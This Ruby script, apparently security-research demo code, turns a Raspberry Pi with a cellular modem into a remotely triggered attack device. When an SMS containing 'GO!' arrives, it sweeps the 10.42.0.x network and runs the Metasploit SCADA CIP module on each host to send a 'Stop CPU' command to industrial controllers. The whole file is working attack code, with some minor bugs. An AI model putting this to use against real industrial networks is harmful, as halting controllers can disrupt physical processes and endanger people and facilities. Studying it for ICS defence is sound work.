##########################################################
#
#	Author: Stephen J. Hilt
#			hilt@digitalbond.com
#
#
#	This Will listen on the drone cell for a Text Message
#	Once specified Message is received, it will then send
#   Stop CPU command on the given network. 
#
#
#########################################################

require "serialport"
require "wiringpi"
require "socket"

def recv_txt(sp) 
	
	# Setup to Read Text
	sp.puts"AT+CMGF=1"
	sp.puts"\r"
	stat = sp.gets.comp
	if (stat.include? '0')
		#Delete all texts
		sp.puts "AT+CMGDA=\"DEL ALL\""
		sp.puts "\r"
		#Disable unsolicited Error Code
		sp.puts "AT+CNMI=0,0"
		sp.puts "\r"
		# while true Read Message #1
		while true do 
			#Read Message
			sp.puts "AT+CMGR=1"
			sp.puts "\r"
			#read in message
			txt = sp.gets.chop
			# If the Text Message is GO!
			if (txt.include? 'GO!')
				# Initialize Counter
				count = 1
				# While Counter is less than 255
				while (count < 255) do
					# Setup IP Address
					ipaddr = '10.42.0.' + count 
					# run metasploit module for each command
					ret_val = system( "msfcli auxiliary/admin/scada/multi_cip_command RHOST=" + ipaddr + " E" )
					# Increment Counter
					count = count + 1
				end
				break
			else
				#do nothing, just wait
				sleep(10)
			end
		end
	
	else
		return 1


	end
end

# RaspberryPi UART Interface
port_str = "/dev/ttyAMA0"
# DoneCell Baud
baud_rate = 38400
# Data Bits  
data_bits = 8
# Stop Bits
stop_bits = 1
# Set Parity
parity = SerialPort::NONE

# GPIO Pins 
gpio = WiringPi::GPIO.new
# Read GPIO Pin 0 (GPIO17)
status = gpio.read(0)
# Unless HIGH then the device is not ready
unless ( status == HIGH)	 
	abort("DroneCell Not Ready")
end

#new instance of SerialPort
sp = SerialPort.new(port_str, baud_rate, data_bits, stop_bits, parity)
# Begin ^C interrupt 
begin

	# set DroneCell to do short responses
	sp.puts "ATV0"
	sp.puts "\r"
	stat = sp.gets.chomp

	while true do 
		# Check to see what status the DroneCell is in
		sp.puts "ATI"
		sp.puts "\r"
		resp = sp.gets.chomp
		# 0 = OK
		# 1 = CONNECT
		# 2 = RING
		# 3 = NO CARRIER
		# 4 = ERROR
		# 5 = NO DIALTONE
		# 6 = BUSY
		# 7 = NO ANSWER
		# 8 = CONNECT OK
		if (resp.include? '0')
			ret = recv_txt(sp)
		elsif (resp.include? '1')
			puts "CONNECT"
		elsif (resp.include? '2')
			puts "RING"
		elsif (resp.include? '3')
			puts "NO CARRIER"
		elsif (resp.include? '4') 
			puts "ERROR"
		elsif (resp.include? '5')
			puts "NO DIALTONE"
		elsif ( resp.include? '6') 
			puts "BUSY"
		elsif ( resp.include? '7')
			puts "NO ANSWER"
		elsif ( resp.include? '8') 
			puts "CONNECT OK"
		elsif ( resp == nil)
			puts "Unknown State - " + resp + "\n"
		else
			
		end
		# sleep 5 seconds
		sleep(5)

	end
	# if control C is encountered
rescue Interrupt => e
	puts "\nThanks for the ^C"
	sp.close
	exit
rescue Errno::EINTR, Errno::EAGAIN # "Had to retry either because we were interrupted or because there was no data"
	IO.select(nil, [sp]) # check if the input is ready after EINTR, if not this will toss EAGAIN triggering another attempt
	retry
rescue Errno::ENOENT
	puts "If you unplugged the wires, please put it back!"
	sleep 10
	retry
rescue Errno::EMFILE
	sp.close
	puts "Too many open files...retrying after a brief sleep"
	sleep 5
retry
	rescue RuntimeError
		retry 
end
# close serial port
sp.close
